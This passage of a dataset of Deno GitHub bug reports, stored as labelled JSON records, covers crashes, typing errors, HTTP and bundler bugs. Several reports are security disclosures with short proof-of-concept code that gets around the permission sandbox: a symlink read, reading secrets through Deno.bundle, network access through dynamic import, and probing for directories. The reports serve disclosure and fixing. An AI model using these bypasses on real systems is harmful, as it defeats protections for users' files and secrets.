Granted read access to \"~/denosaur/my_mod.js\"\r\nop_stat ~/denosaur/my_mod.js false\r\nDEBUG JS - sendSync op_read_link 23\r\n⚠️️  Granted read access to \"~/denosaur/my_mod.js\"\r\nop_read_link ~/denosaur/my_mod.js\r\nbefore\r\nDEBUG JS - sendSync op_open 8\r\n⚠️️  Granted read access to \"~/denosaur/package.json\"\r\nread rid=3\r\nread rid=3\r\nDEBUG JS - sendSync op_close 62\r\nafter\r\nDEBUG JS - sendSync op_open 8\r\n⚠️️  Granted read access to \"~/denosaur/my_mod.js\"\r\nread rid=4\r\nread rid=4\r\nDEBUG JS - sendSync op_close 62\r\nDEBUG JS - sendSync op_stat 17\r\n⚠️️  Granted read access to \"~/denosaur/node_modules\"\r\nop_stat ~/denosaur/node_modules false\r\nbefore\r\nDEBUG JS - sendSync op_open 8\r\n⚠️️  Granted read access to \"~/denosaur/node_modules/left-pad/package.json\"\r\nread rid=5\r\n```\r\n</details>\r\n\r\nHowever, on branch `left_pad_ok`, everything is working just fine, with just 4 lines of code difference. You can see the diff here: https://github.com/shian15810/denosaur/compare/left_pad_fail...left_pad_ok\r\n\r\nCommenting out these 4 totally unrelated lines, deno didn't get stuck anymore.\r\nIt seems like these 4 lines are making `Deno.readFileSync` to fail, but it doesn't make any sense.\r\nIf it really did fail, shouldn't it should be handled by the `catch` block?\r\n\r\nIs this a bug?"},{"labels":["bug"],"text":"# Example\r\n```typescript\r\n// test.ts\r\nconst error = new Error(\"Example\");\r\nError.captureStackTrace(error);\r\nthrow error;\r\n```\r\n## Expected `run` result\r\nSuccessful typecheck and output of\r\n```\r\nerror: Uncaught Error: Example\r\n► file:///tmp/test.ts:2:7\r\n\r\n2 Error.captureStackTrace(error);\r\n        ^\r\n\r\n    at file:///tmp/test.ts:2:7\r\n```\r\n(As if the above code were in a file named `test.js`)\r\n\r\n## Actual `run` result\r\n```\r\nerror TS2339: Property 'captureStackTrace' does not exist on type 'ErrorConstructor'.\r\n\r\n► file:///tmp/test.ts:2:7\r\n\r\n2 Error.captureStackTrace(error);\r\n        ~~~~~~~~~~~~~~~~~\r\n```\r\n\r\n# System\r\n```\r\n> deno --version\r\ndeno 0.40.0\r\nv8 8.2.308\r\ntypescript 3.8.3\r\n```"},{"labels":["bug"],"text":"This is what we're using:\r\n\r\nhttps://github.com/denoland/deno/blob/v0.39.0/cli/js/web/fetch.ts#L286-L295\r\n\r\nCompare with \r\n\r\nhttps://github.com/microsoft/TypeScript/blob/3398c9bfe1e474e2f81e5ea05d01645e329e5860/src/lib/dom.generated.d.ts#L12604"},{"labels":["bug",null,null],"text":"```javascript\r\nconst customPromise= Object.create(Promise.prototype, {then:..., catch:..., finally:...});\r\n\r\nconsole.log(customPromise);\r\n```\r\nIt throws a type error.\r\n```bash\r\nerror: Uncaught TypeError: Invalid argument\r\n► $deno$/web/console.ts:454:37\r\n    at createPromiseString ($deno$/web/console.ts:454:37)\r\n    at createObjectString ($deno$/web/console.ts:565:12)\r\n    at stringify ($deno$/web/console.ts:294:14)\r\n    at stringifyArgs ($deno$/web/console.ts:679:14)\r\n    at Console.log ($deno$/web/console.ts:723:7)\r\n    at <unknown>:1:9\r\n    at evaluate ($deno$/repl.ts:64:34)\r\n    at replLoop ($deno$/repl.ts:153:13)\r\n```\r\n\r\n```bash\r\ndeno --version\r\ndeno 0.39.0\r\nv8 8.2.308\r\ntypescript 3.8.3\r\n```\r\n\r\nSame example works well on 0.38 and before.\r\n"},{"labels":["bug"],"text":"https://github.com/denoland/deno/blob/6720a0dc02dc5a93472520e6d23ca033d7ec9d88/std/examples/chat/server.ts#L49\r\n\r\nthis line have some problems in windows while running locally , error text : \r\n\r\n```\r\nerror: Uncaught NotFound: The system cannot find the path specified. (os error 3)\r\n► $deno$/ops/dispatch_json.ts:43:11\r\n    at NotFound ($deno$/errors.ts:75:5)\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at sendAsync ($deno$/ops/dispatch_json.ts:98:10)\r\n```\r\n\r\ndeno version : 0.39.0\r\nwindows : 10 x64\r\n\r\ni will make a PR for this"},{"labels":["bug",null],"text":"I had made an error with the way I was setting up the path for dynamic imports, and it was crashing showing a thread panic on the rust side. I checked the path, and it was using the actual absolute path on windows (C:\\...). I fixed this to use the relative path, and it loads fine. The problem, in my opinion, is that it panics when the path provided is not using the file:/// prefix, or a relative path."},{"labels":["bug"],"text":"## Steps to reproduce\r\n\r\n1. create a server:\r\n```js\r\nimport { serve } from \"https://deno.land/std/http/server.ts\";\r\nconst s = serve({ port: 8000 });\r\nconsole.log(\"http://localhost:8000/\");\r\n\r\nconst headers = new Headers({\r\n    'Content-Type': 'text',\r\n});\r\n\r\nfor await (const req of s) {\r\n    const rawBody = await Deno.readAll(req.body);\r\n    const bodyStr = new TextDecoder().decode(rawBody);\r\n    req.respond({ headers, body: bodyStr });\r\n}\r\n```\r\n2. sent a request like this:\r\n```shell\r\ncurl -d \"hello\" http://localhost:8000\r\n```\r\nthe server responde `hello` successfully.\r\n\r\n3. sent another request like this: \r\n```shell\r\ncurl -d \"foo\" http://localhost:8000\r\n```\r\n\r\n**Expected result:** server returns `foo`\r\n**Actual result:** server hangs\r\n\r\nSimilarly, if sent `foo` in the first request, then send `hello` in the second request, then the second response will be `hel` instead of `hello`. \r\n\r\n## Root cause\r\n`io.ts` has a method `setContentLength()`, it set `Content-Length` only if `headers` doesn't have it. In the example above, `headers` is re-used between two responses, so the second response is still using the `Content-Length` set by the first response, and the response body is written based on this length. thus:\r\n- the 2nd response hangs if its  body is shorter than 1st response body\r\n- the 2dn response body is incomplete if it is longer than the 1st response body\r\n\r\n## Suggestion\r\nTechnically this might not be a bug, but it is super difficult for web app developer to figure out what's going on. We could \r\n- clone the headers before setting content-length\r\n- send out warning or even error if the body length is different from `headers['Content-Length']`"},{"labels":["bug",null,null],"text":"When error is catch, no crashes happen:\r\n\r\n```sh\r\ndeno run --allow-net https://deno.land/x/yaml_wasm@0.1.0/preview/browser/failure.js\r\n```\r\n\r\nBut when error is left uncautch, deno crashes.\r\n\r\n```sh\r\ndeno run --allow-net https://deno.land/x/yaml_wasm@0.1.1/preview/browser/failure.js\r\n```\r\n\r\n```\r\nthread 'main' panicked at 'not implemented: Don't know how to create cache name for scheme: wasm', cli/disk_cache.rs:82:9\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n```\r\n\r\nThe second version run perfectly in browser: https://ksxgithub.github.io/yaml-wasm/preview/browser/"},{"labels":["bug"],"text":"https://gist.github.com/piscisaureus/0109924324147eeeeb1146376d15ea9e"},{"labels":["bug"],"text":"cc @bartlomieju "},{"labels":["bug",null],"text":"### Reproduction\r\n1. Generate test file:\r\n```bash\r\necho \"hello world\" > file.txt\r\nfor i in {1..10}; do cat file.txt file.txt > file2.txt && mv file2.txt file.txt; done\r\n```\r\n2. create test.js\r\n```js\r\nconst proc = Deno.run({\r\n  cmd: [\"cat\", \"test.json\"],\r\n  stdout: \"piped\",\r\n  stderr: \"piped\"\r\n});\r\n\r\nconst status = await proc.status();\r\n```\r\n3. run test.ts\r\n```bash\r\ndeno --allow-run test.js\r\n```\r\n\r\n4. Deno gets stuck on `await proc.status()`.\r\n"},{"labels":["bug",null],"text":"I have tried `deno repl --inspect` and it prints an error:\r\n\r\n```\r\nerror: Found argument '--inspect' which wasn't expected, or isn't valid in this context\r\n```\r\n"},{"labels":["bug"],"text":"`setCookie` in `std/http/cookie.ts` will reset other cookies being set (replace the entire `Set-Cookie` header). I did not expect this.\r\n\r\nPerhaps the easiest fix is to change from:\r\n\r\n    setCookie(res: Response, cookie: Cookie)\r\n\r\nto\r\n\r\n    setCookies(res: Response, cookies: Cookie[])\r\n\r\nAlternatively, perhaps `res.headers.append()` can be used in `setCookie`.\r\n\r\nAs it stands now, there is no way to set/modify two cookies in a single response with these utilities (e.g. session id and nonce for OAuth)."},{"labels":["bug",null],"text":"Given the following code:\r\n```javascript\r\nawait Deno.utime(\"my_file.txt\", new Date(), new Date());\r\n```\r\nThe process errors out on v0.38.0 with:\r\n\r\n> error: Uncaught InvalidData: invalid type: floating point `1585688574.996`, expected u64\r\n\r\nThe same error is present with `Deno.utimeSync()` as well."},{"labels":["bug",null],"text":"More details in [this repo](https://github.com/KSXGitHub/deno-issue-bundle-export-star-as)"},{"labels":["bug",null],"text":"## Steps to reproduce\r\n\r\nRun `deno bundle https://deno.land/x/once/index.js`\r\n\r\n## Expected behavior\r\n\r\nIt prints a bundled JavaScript code\r\n\r\n## Actual behavior\r\n\r\n```\r\nerror TS5012: Cannot read file 'https://deno.land/x/once/index.js': Error: assert.\r\n\r\n► \r\nerror TS6053: File 'https://deno.land/x/once/index.js' not found.\r\n\r\n► \r\n\r\nFound 2 errors.\r\n```\r\n\r\n---\r\n\r\nI didn't try to bundle remote URL at first, instead, I tried bundling a local file (`deps.ts`) that import remote JS file. No compile errors occur, but a runtime error (cannot read property of `undefined`) was thrown when attempting to run it in the browser and in Node.js.\r\n"},{"labels":["bug"],"text":"Hi,\r\nthe [umask_test](https://github.com/denoland/deno/blob/aab1acaed163f91aa5e89b079c5312336abb2088/cli/js/tests/umask_test.ts#L14) fails on my machine, because I have a default umask of 0o002. I assume this is not really a problem, because the test suite is primarily [executed against Github CI](https://github.com/denoland/deno/pull/4290), but it is still kinda weird to freshly build a project and fail the test suite."},{"labels":["bug"],"text":"https://gist.github.com/stevejmason/2fab8149460a5565ef388f92cd2e478e\r\n\r\nWhen running the above gist with Deno, the process crashes with `BorrowMutError`, see Actual text below. I believe this is caused by the mutable borrow calls within the async blocks on `cli/ops/net.rs:144` and `cli/ops/net.rs:212`.\r\n\r\nPerhaps we can use `tokio::net::udpsocket split()` and update `UdpSocketResource` to have a send/recv half contained in `Arc<Mutex<>>`, borrow state immutably on the main thread, clone the Arc container and use this from the async block? I have a working version to push, but would like some feedback on this approach as I'm fairly new to Rust.\r\n\r\n(**sidenote**, the gist is unlikely to run on master due to the new NetAddr/UnixAddr interfaces, I've been playing with types to add generics to `DatagramImpl` which i'll follow up with).\r\n\r\n### Actual output\r\n```\r\nthread 'main' panicked at 'already borrowed: BorrowMutError', /rustc/b8cedc00407a4c56a3bda1ed605c6fc166655447/src/libcore/cell.rs:878:9\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n```\r\n\r\n### Expected output (duplicate lines removed)\r\nUsing fork - https://github.com/stevejmason/deno/tree/async-udp\r\n```\r\nTEST SOCKET RECV (1): hello world ! from [127.0.0.1:44444]\r\nTEST SOCKET RECV (...10): hello world ! from [127.0.0.1:44444]\r\nReceived: [This is a response for message (1)] from (127.0.0.1:25262)\r\nReceived: [This is a response for message (...10)] from (127.0.0.1:25262)\r\n```\r\n\r\n### Deno version (also `master#2874664`)\r\n```\r\ndeno 0.36.0\r\nv8 8.1.310\r\ntypescript 3.8.3\r\n```"},{"labels":["bug"],"text":"v0.37.1\r\n```\r\n~/src/deno2> deno x.js\r\nthread 'main' panicked at 'assertion failed: lines.len() > line', cli/compilers/ts.rs:557:11\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\nError 101 ~/src/deno2> cat x.js\r\nsetInterval(() => {\r\n  console.log(\"hello\");\r\n}, 1000),\r\n```"},{"labels":["bug"],"text":"1. I downloaded v37 `deno-x86_64-pc-windows-msvc.zip` from github.\r\n\r\n2. put the exe inside of the existing deno location and told it to replace the old one.\r\n\r\n3. Tried to run `deno` in **git bash** and got:  `C:/Users/MyName/.local/bin/deno.exe: error while loading shared libraries: api-ms-win-crt-multibyte-l1-1-0.dll: cannot open shared object file: No such file or directory`\r\n\r\n4. Tried to run `deno` in **command prompt** and got: `VCRUNTIME140_1.dll was not found`\r\n\r\nIt's possible that I'm just missing some Visual Studio runtime files, or that I replaced the old exe with a different type of exe this time. Just not sure."},{"labels":["bug"],"text":"Ran into this error while working on `fp-ts`:\r\n\r\n```\r\n% cat import-in-comment.ts \r\nfunction hello(who: string): string {\r\n  return `hello ${who}`;\r\n}\r\n/**\r\n * `\r\n * import { scanLeft } from 'some/path/in/comment.ts'\r\n */\r\n\r\n% deno import-in-comment.ts\r\nCompile file:///Users/jaka/Desktop/import-in-comment.ts\r\nerror: Uncaught URIError: relative import path \"some/path/in/comment.ts\" not prefixed with / or ./ or ../ Imported from \"file:///Users/jaka/Desktop/import-in-comment.ts\"\r\n► $deno$/errors.ts:35:13\r\n    at constructError ($deno$/errors.ts:35:13)\r\n    at unwrapResponse ($deno$/dispatch_json.ts:41:12)\r\n    at sendSync ($deno$/dispatch_json.ts:70:10)\r\n    at resolveModules ($deno$/compiler_imports.ts:70:10)\r\n    at processImports ($deno$/compiler_imports.ts:172:27)\r\n    at processImports ($deno$/compiler_imports.ts:181:13)\r\n```\r\n\r\nSome rogue regexp somewhere?"},{"labels":["bug"],"text":"I am observing that an error thrown by a dynamic import always results in an \"uncaught error\".  Here is an example:\r\n\r\n```ts\r\n// a.ts\r\ntry {\r\n  await import('./b.ts')\r\n} catch {\r\n  console.log('catch')\r\n}\r\n```\r\n\r\n```ts\r\n// b.ts\r\nthrow Error()\r\n```\r\n\r\nExpected Output:\r\n```\r\ncatch\r\n```\r\n\r\nActual Output:\r\n```\r\ncatch\r\nerror: Uncaught Error\r\n    at file:///b.ts:1:7\r\n```"},{"labels":["bug"],"text":"If `test.ts` is:\r\n```\r\nconst { symlinkSync, readFileSync } = Deno;\r\n\r\ntry {\r\n  const s = readFileSync(\"./test_private/file\");\r\n  console.log(s);\r\n} catch(e) {\r\n  console.log(\"caught\", e.name);\r\n}\r\n\r\nsymlinkSync(\"./test_private/file\", \"./test_public/file\");\r\nconst s = readFileSync(\"./test_public/file\");\r\nconsole.log(\"success!\", new TextDecoder().decode(s));\r\n```\r\n\r\nThen:\r\n```\r\n$ deno --version\r\ndeno 0.36.0\r\nv8 8.1.310\r\ntypescript 3.8.3\r\n$ mkdir test_private test_public\r\n$ echo data > test_private/file\r\n$ deno --allow-read=./test_public --allow-write=./test_public test.ts\r\ncaught PermissionDenied\r\nsuccess! data\r\n```\r\n\r\nHence, if I know that `./test_private/file` exists, and have `--allow-read --allow-write` access anywhere, I can create a symlink to `./test_private/file` and put it in the second location, giving me (at least) read access to `./test_private/file`. (I verified that I'll also have write access to it.)\r\n\r\nCombined with the issues in #4423, if I have only `--allow-write` but not `--allow-read` access to `./test_private`, I have the means to query the existence of any paths underneath it.\r\n\r\nWe could partly address this by having `op_symlink` require `--allow-read` access on its source file. I don't know if that would break the ability to create symlinks to non-existent paths. I don't think it would prevent one from gaining write access to any path they had read access to, if they had read/write access to any other path (such as `/tmp`).\r\n\r\nA different strategy for addressing might be to have our `state.check_read`/`check_write` machinery follow symlinks?"},{"labels":["bug",null],"text":"Deno.bundle() takes in as argument a file name as a string.  If the file is of a supported media type (currently javascript, JSX, Typescript, TSX, Json or Wasm), it will bundle that file up and return the output to the calling module as a string of Javascript.  No permissions are required.  This effectively gives the calling module the ability to read the contents of any these media types located anywhere on the file system without requiring any permission.\r\n\r\n**Proof of concept**\r\n\r\n/some/other/dir/secrets.json\r\n```json\r\n{\"my_secret_API_key\":\"abcd1234\"}\r\n```\r\n\r\n/deno/module/dir/bundle_poc.ts\r\n```typescript\r\nconst [ maybeDiagnostics, output ] = await Deno.bundle(\"/some/other/dir/secrets.json\");\r\nconsole.log(output);\r\n```\r\n\r\nwhen executed as:\r\n`deno bundle_poc.ts`\r\n\r\nThe output (trimmed) is:\r\n```javascript\r\nCompile file:///deno/module/dir/bundle_poc.ts\r\n// Copyright 2018-2020 the Deno authors. All rights reserved. MIT license.\r\n\r\n// This is a specialised implementation of a System module loader.\r\n\r\n// @ts-nocheck\r\n/* eslint-disable */\r\n\r\nlet System, __inst, __inst_s;\r\n\r\n<...trimmed output...>\r\n\r\n{ \"my_secret_API_key\": \"abcd1234\" }\r\n\r\n__inst_s(\"secrets\");\r\n\r\n```\r\n\r\nAs demonstrated above, this method exposes the json data to the calling module.  If Deno.bundle() can access any of these media types on the file system and allow the content to be accessed in the module, it should be required to run under the `--allow-read` permission. "},{"labels":["bug"],"text":"`https://httpbin.org/status/302` is a url that does a few redirects, ending at `https://httpbin.org/get`.\r\n\r\n    fetch('https://httpbin.org/status/302')\r\n      .then(res => console.log(res.status, res.headers))\r\n\r\nFollows redirects, prints status 200, headers, as expected.\r\n\r\n    fetch('https://httpbin.org/status/302', {redirect: 'manual'})\r\n      .then(res => console.log(res.status, res.headers))\r\n\r\nPrints status 0, empty headers.\r\n\r\nExpected: status 302, headers including `Location`.\r\n"},{"labels":["bug",null,null],"text":"@jakajancar [reports](https://github.com/denoland/deno/issues/3401#issuecomment-598860712):\r\n\r\nThat `import` isn't routed through the general access checks is concerning. Makes me wonder: what else isn't?\r\n\r\nYou can also bypass `--allow-net`:\r\n\r\n`poc.js`:\r\n```\r\nconst encoder = new TextEncoder();\r\nDeno.writeFileSync(\"/tmp/make-request.ts\",\r\n    encoder.encode(\"import * as foo from 'http://example.com/foobar'\"));\r\nwhile (true) {\r\n    try {\r\n        await import('/tmp/make-request.ts');\r\n    } catch (e) {}\r\n}\r\n```\r\n\r\n```\r\n% deno --allow-read=/tmp --allow-write=/tmp poc.js\r\nCompile file:///tmp/include.ts\r\nDownload http://example.com/foobar\r\nCompile file:///tmp/include.ts\r\nDownload http://example.com/foobar\r\nCompile file:///tmp/include.ts\r\nDownload http://example.com/foobar\r\nCompile file:///tmp/include.ts\r\nDownload http://example.com/foobar\r\nCompile file:///tmp/include.ts\r\nDownload http://example.com/foobar\r\n...\r\n```\r\n\r\n(Sure, it's only a DoS-ish / timing attack thing, but still...)\r\n\r\nAlso, it's not enough to just solve JSON. You can also check for existence of directories outside of your sandbox:\r\n\r\n`poc2.js`:\r\n```\r\nconst encoder = new TextEncoder();\r\n\r\nasync function dir_exists(path) {\r\n    const tmpFile = '/tmp/' + Math.random() + '.ts'\r\n    Deno.writeFileSync(tmpFile, encoder.encode(`import * as foo from '${path}'`));\r\n    try {\r\n        await import(tmpFile);\r\n    } catch (e) {\r\n        return e.message.includes('Is a directory');\r\n    }\r\n}\r\n\r\nconsole.log('jaka', await dir_exists('/Users/jaka'));\r\nconsole.log('mike', await dir_exists('/Users/mike'));\r\n```\r\n```\r\n% deno --allow-read=/tmp --allow-write=/tmp po2c.js \r\nCompile file:///tmp/0.05196201107122267.ts\r\njaka true\r\nCompile file:///tmp/0.8575097111751213.ts\r\nmike false\r\n```\r\n\r\nI propose everything is just made explicit and require `--allow-read` to the source directory.\r\nI would also require `--allow-net` for import from internet.\r\nWithout any arguments, it should be as secure as a stock V8 or a browser.\r\nAll fs/net access should be centrally routed, or some contributor in 1 year will introduce a vuln.\r\n\r\nFor a real non-sanboxed app, you'll need a wrapper anyways (shebang doesn't work for anything non-trivial, e.g. you can't specify a relative importmap). Only thing affected will be the sexy one-liners.\r\n\r\nMeanwhile, the other way, securing things if defaults are loose, is nearly impossible."},{"labels":["bug"],"text":"```\r\nRunning tests for: --allow-run --allow-env\r\nrunning 1 tests\r\nerror: Uncaught ConnectionReset: An existing connection was forcibly closed by the remote host. (os error 10054) \r\n► $deno$/ops/dispatch_minimal.ts:63:11\r\n    at ConnectionReset ($deno$/errors.ts:93:5)\r\n    at unwrapResponse ($deno$/ops/dispatch_minimal.ts:63:11)\r\n    at sendAsyncMinimal ($deno$/ops/dispatch_minimal.ts:106:10)\r\n```\r\nhttps://github.com/denoland/deno/pull/4349/checks?check_run_id=507856283\r\n\r\nIt looks like this happens during running of `envCaseInsensitive` test, but happens only sometimes. Error suggests that TCP connection between parent and worker process is closed. I'm not sure what cases this failure.\r\n\r\n"},{"labels":["bug",null],"text":"The following example is pretty much self-explanatory:\r\n\r\n```javascript\r\nnew Promise(function(resolve, reject) {\r\n  setTimeout(() => {\r\n    throw new Error(\"Whoops!\")\r\n  }, 1000)\r\n}).catch(console.log)\r\n```\r\n\r\nInstead of throwing the `Error` deno ignores it."},{"labels":["bug"],"text":"**Deno version:** 0.35.0\r\n\r\n**Trying to compile a `.js` file results in `Uncaught Error: Unexpected skip of the emit.`**\r\n\r\nAttempting the following\r\n`./app.js`\r\n```javascript\r\nconsole.log(\"Compile me\");\r\n```\r\n\r\n`./compile_app.js`\r\n```javascript\r\nconst [compile_diag, compile_res] = await Deno.compile(\r\n  \"./app.js\",\r\n  undefined,\r\n  {\r\n    allowJs: false,\r\n    checkJs: false,\r\n    lib: [\"es2018\"],\r\n    sourceMap: false,\r\n    target: \"es2018\",\r\n  }\r\n);\r\n\r\ncompile_diag && console.log(Deno.formatDiagnostics(compile_diag));\r\n\r\nconst truncate_filename = filename => filename.replace('file:///', '');\r\n\r\nfor (const [filename, text] of Object.entries(compile_res)) {\r\n  console.log(`${truncate_filename(filename)}`);\r\n  console.log(text.split('\\n').map(line => `\\t${line}`).join('\\n'));\r\n}\r\n\r\n```\r\n\r\nResults in:\r\n\r\n![imagen](https://user-images.githubusercontent.com/42647963/76215285-70b79400-61dc-11ea-9951-59f2a7017a13.png)\r\n\r\nQuite probably because the resulting filename matches the original filename, however since `Deno.compile` does not write anything into the filesystem this should not be a problem.\r\n\r\nSame thing happens when attempting to compile a JS and TS file named the same on the same route. Ex: `mod.js` & `mod.ts`,\r\n"},{"labels":["bug"],"text":"At first, this is very complicated situation. \r\n\r\n### Problem occurred\r\n\r\n- Server process (with Deno.listen()) won't exit even after `listener.close()` called.\r\n- There are no active resources except rid=0-2\r\n\r\n### Code\r\n\r\nThese are very simple request-response type TCP server and client.\r\n\r\n**server.ts**\r\n```ts\r\nasync function server() {\r\n  const l = Deno.listen({ port: 4444 });\r\n  let buf = new Uint8Array(4);\r\n  const conn = await l.accept();\r\n  const process = async function* () {\r\n    while (true) {\r\n      console.log(\"[server] reading\");\r\n      // Read request with timeout\r\n      const nr = await Promise.race([\r\n        conn.read(buf),\r\n        new Promise((resolve) => {\r\n          setTimeout(resolve, 100);\r\n        })\r\n      ]);\r\n      if (!nr) {\r\n        console.log(\"[server] read timeout\");    \r\n        conn.close();\r\n        return \r\n      } else {\r\n        console.log(\"[server] read done\", nr);\r\n        console.log(\"[server] writing\");\r\n        const nw = await conn.write(new Uint8Array([0,1,2,3]));\r\n        console.log(\"[server] written\", nw);\r\n      }\r\n    }\r\n  }\r\n  for await (const _ of process());\r\n  l.close();\r\n  console.log(\"[server] close\", Deno.resources());\r\n}\r\nserver();\r\n```\r\n\r\n**client.ts**\r\n```ts\r\nconst conn = await Deno.connect({ port: 4444 });\r\nasync function reqRes() {\r\n  console.log(\"[cli] writing\");\r\n  const nw = await conn.write(new Uint8Array([0,1,2,3]));\r\n  console.log(\"[cli] written\", nw);\r\n  const buf = new Uint8Array(4);\r\n  console.log(\"[cli] reading\");\r\n  const nr = await conn.read(buf);\r\n  console.log(\"[cli] read done\", nr);  \r\n}\r\n// First request-response: \r\nawait reqRes();\r\n// Second request-response: expect error as conn is closed by server\r\nsetTimeout(async () => {\r\n  try {\r\n    await reqRes(); \r\n  } catch (e) {\r\n    console.error(e);    \r\n  } finally {\r\n    conn.close();\r\n  }\r\n  console.log(\"[cli] close\", Deno.resources());\r\n}, 200);\r\n```\r\n\r\n### Logs\r\n\r\n**server.ts**\r\n```\r\n[server] reading\r\n[server] read done 4\r\n[server] writing\r\n[server] written 4\r\n[server] reading\r\n[server] read timeout\r\n[server] close { 0: \"stdin\", 1: \"stdout\", 2: \"stderr\" }\r\n<- hangs\r\n```\r\n\r\n**client.ts**\r\n```\r\n[cli] writing\r\n[cli] written 4\r\n[cli] reading\r\n[cli] read done 4\r\n[cli] writing\r\n[cli] written 4\r\n[cli] reading\r\nConnectionReset: Connection reset by peer (os error 54)\r\n    at Object.constructError ($deno$/errors.ts:43:13)\r\n    at unwrapResponse ($deno$/dispatch_minimal.ts:59:12)\r\n    at Object.sendAsyncMinimal ($deno$/dispatch_minimal.ts:102:10)\r\n    at async Object.read ($deno$/files.ts:154:17)\r\n    at async reqRes (file:///Users/keroxp/src/deno-pg/conn/client.ts:8:14)\r\n    at async file:///Users/keroxp/src/deno-pg/conn/client.ts:16:5\r\n[cli] close { 0: \"stdin\", 1: \"stdout\", 2: \"stderr\" }\r\n<- exit\r\n```\r\n\r\n### Guess\r\n\r\nSome async handle by `conn.read(buf)` won't be released after `conn.close()` or `listener.close()` called if it hasn't be resolved. I think Closer should cleanup unresolved IO handle."},{"labels":["bug"],"text":"<img width=\"701\" alt=\"スクリーンショット 2020-03-05 21 21 49\" src=\"https://user-images.githubusercontent.com/927286/75981218-6456e100-5f27-11ea-8605-aeb5acda4e38.png\">\r\n\r\n**Env:**\r\n- macOS 10.15\r\n- iTerm2, Terminal\r\n- zsh"},{"labels":["bug"],"text":"deno 0.35.0\r\nv8 8.1.310\r\ntypescript 3.8.2\r\n\r\nI was working with [wabt.js](https://github.com/AssemblyScript/wabt.js) today and trying to get it working with deno as well as the browser.  When testing, I noticed deno was creating huge errors, so big in fact, I had to save them to a file to read them.  It almost seems like the error contains the entire program, or one of the huge lines.  wabt.js is built using emscripten, which creates pretty ugly javascript, so I'm not sure if this only occurs when deno runs something that emscripten has built.\r\n\r\nAn example of the error:\r\n```sh\r\ndeno https://raw.githubusercontent.com/Sharpiro/bugs/0d41bbe0d3ee8cf2e052cbc76d7f00b917a933fd/deno/large_errors/index.js\r\n```\r\n\r\nadd `&> temp` to output it to file\r\n```sh\r\ndeno https://raw.githubusercontent.com/Sharpiro/bugs/0d41bbe0d3ee8cf2e052cbc76d7f00b917a933fd/deno/large_errors/index.js &> temp\r\n```\r\n\r\nAs an aside here is a fork of WABT I got working today in deno after fixing the errors:\r\nhttps://github.com/Sharpiro/wabt.js/blob/9ea629b1c31f80c70efdf9d01b489274beb0ddb1/index.js"},{"labels":["bug"],"text":"After #3972 landed I'm getting `cafile_info` failures 5/10 CI runs which make it unusable. \r\n\r\nhttps://github.com/denoland/deno/pull/4246/checks?check_run_id=484893859\r\n\r\nWe should either revert the PR or fix underlying server issue "},{"labels":["bug"],"text":"Hi,\r\n\r\nin my tsconfig.json:\r\n\r\n```json\r\n\"compilerOptions\": {\r\n  \"lib\": [\"esnext\", \"dom\", \"deno.ns\"]\r\n}\r\n```\r\n\r\n...and with Deno 0.35.0:\r\n\r\n```sh\r\nerror TS2488: Type 'Headers' must have a '[Symbol.iterator]()' method that returns an iterator.\r\n\r\n► https://deno.land/std/http/io.ts:135:24\r\n\r\n135   for (const [k, v] of result) {\r\n                           ~~~~~~\r\n\r\nerror TS2488: Type 'Headers' must have a '[Symbol.iterator]()' method that returns an iterator.\r\n\r\n► https://deno.land/std/http/io.ts:206:30\r\n\r\n206   for (const [key, value] of trailers) {\r\n                                 ~~~~~~~~\r\n\r\nerror TS2488: Type 'Headers' must have a '[Symbol.iterator]()' method that returns an iterator.\r\n\r\n► https://deno.land/std/http/io.ts:260:30\r\n\r\n260   for (const [key, value] of headers) {\r\n```\r\n"},{"labels":["bug"],"text":"### Environment\r\n- Windows 10 Home version 1909\r\n- Deno version 0.35.0\r\n\r\n### Steps to Reproduce\r\n1. Create a file `test.ts`\r\n```ts\r\nwindow.addEventListener(\"load\", async () => {\r\n  console.log(\"hello\");\r\n});\r\n```\r\n2. Run the file: `deno test.ts`\r\n\r\n### Expected Behavior\r\nThe program prints `hello`, then exits with no errors.\r\n\r\n### Actual Behavior\r\nThe following error is printed to the console and the program exits without printing `hello`:\r\n```\r\nerror TS2345: Argument of type '() => Promise<void>' is not assignable to parameter of type '(event: Event) => void | null'.\r\n  Type 'Promise<void>' is not assignable to type 'void'.\r\n\r\n► file:///Path/To/CWD/test.ts:1:33\r\n\r\n1 window.addEventListener(\"load\", async () => {\r\n```\r\n\r\n### Notes\r\n- I believe having an async function as an event handler is valid JS/TS, it ran in previous versions of Deno (as recently as v30). Thinking it was probably broken by #3899. If I rename the file to `test.js` it runs without a problem.\r\n- I'm guessing this error being thrown has to do with Deno's type declaration for event handlers. While I'm not familiar enough with the code base to know exactly where the problematic declaration is, these seem like likely candidates\r\n  - https://github.com/denoland/deno/blob/a3bfbcceade3d359f677106399562b461b4af01a/cli/js/globals.ts#L107\r\n  - https://github.com/denoland/deno/blob/6cd46fa3ef4b12f35a60f1a33c7f038c06b5fc71/cli/js/lib.deno.shared_globals.d.ts#L45\r\n  - https://github.com/denoland/deno/blob/dd8a10948195f231a6a9eb652e3f208813904ad6/cli/js/event_target.ts#L38\r\n  - https://github.com/denoland/deno/blob/2b0cf74a8f6335ae4e8ef2dfe1010d2695b1c518/cli/js/dom_types.ts#L86"},{"labels":["bug",null,null],"text":"## Steps to reproduce\r\n\r\nCreate `server.js` with the following content:\r\n\r\n```js\r\nimport { serve } from \"https://deno.land/std@v0.35.0/http/server.ts\";\r\nconst s = serve({ port: 8000 });\r\nconsole.log(\"http://localhost:8000/\");\r\nfor await (const req of s) {\r\n  req.respond({ body: \"Hello World\\n\" });\r\n}\r\n```\r\n\r\nRun `deno bundle server.js out.js`\r\n\r\nRun `deno out.js`\r\n\r\n## Expected result\r\n\r\nThe code runs\r\n\r\n## Actual result\r\n\r\n```sh\r\nerror: Uncaught SyntaxError: Unexpected reserved word\r\n► file:///path/to/out.js:113:17\r\n\r\n113             for await (const req of s) {\r\n                    ~~~~~\r\n```\r\n\r\n## Notes\r\n\r\nAdding `await console.log(\"test\");` or any other `await` statement is detected by the bundler and allows the `for-await` block to work properly. (See #4206)\r\n\r\n```\r\ndeno 0.35.0\r\nv8 8.1.310\r\ntypescript 3.8.2\r\n```"},{"labels":["bug"],"text":"## Steps to reproduce\r\n\r\nCreate `server.js` with the following content:\r\n\r\n```js\r\nimport { serve } from \"https://deno.land/std@v0.35.0/http/server.ts\";\r\nconst s = serve({ port: 